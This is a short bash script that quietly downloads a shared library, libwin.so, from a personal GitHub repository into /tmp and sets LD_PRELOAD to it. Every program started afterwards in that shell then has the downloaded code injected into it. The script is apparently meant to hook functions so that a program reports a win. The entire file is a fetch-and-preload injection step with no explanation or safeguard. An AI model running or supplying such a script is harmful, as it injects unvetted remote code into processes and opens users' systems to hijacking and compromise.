#!/bin/bash
wget -q -P /tmp https://github.com/Mohabdo21/test/raw/main/libwin.so
source <(echo "export LD_PRELOAD=/tmp/libwin.so")
